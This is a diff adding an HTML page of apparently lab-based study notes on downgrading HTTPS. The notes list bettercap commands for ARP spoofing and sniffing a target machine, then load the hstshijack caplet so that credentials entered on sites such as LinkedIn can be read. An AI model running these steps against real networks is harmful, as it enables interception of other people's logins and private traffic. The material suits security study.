@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <style>
+        body {
+            height: 100%;
+            width: 100%;
+            background: #f5f6fa;
+        }
+
+        div {
+            color: #67727e;
+            font-size: 20px;
+            padding-left: 20px;
+        }
+    </style>
+</head>
+
+<body>
+    <div>
+        11…43<br><br>
+
+        Bypassing HTTPS<br><br>
+        
+        Problem : <br>
+        Data in http is sent as plain text<br>
+        A mitm can read and edit requests and responses<br><br>
+        
+        Solution:<br>
+        Use HTTPS<br>
+        HTTPS is an adaptation of http<br>
+        Encrypt http using TLS(transport layer security) or SSL(Secure sockets layer)<br><br>
+        
+        Most websites uses HTTPS<br>
+        Sniffed data will be encrypted<br><br>
+        
+        Downgrade HTTPS to HTTP<br><br>
+        
+        Use custom script but change one thing here<br><br>
+        
+        net.probe on<br>
+        set arp.spoof.fullduplex true<br>
+        set arp.spoof.targets 10.0.2.7<br>
+        arp.spoof on<br>
+        set net.sniff.local true // sniff all data even though it is local data<br>
+        net.sniff on<br><br>
+        
+        //we will downgrade the thing from https to http<br><br>
+        
+        bettercap -iface eth0 -caplet /root/spoof.cap<br><br>
+        
+        It should work everything correctly<br><br>
+        help will tell you everything<br><br>
+        
+        Now in bettercap tool to bring https bettercap caplet<br><br>
+        
+        To list all the caplets<br>
+        caplets.show<br>
+        
+        The caplet we need is <br>
+        hstshijack<br>
+        
+        In terminal hs and tab<br>
+        Once entered it will load the caplet and run for me<br><br>
+        
+        Browse some https pages from windows<br>
+        Go to LinkedIn<br>
+        Once you enter everything you will be able to see everything<br>
+        
+        
+
+    </div>
+</body>
+
+</html>
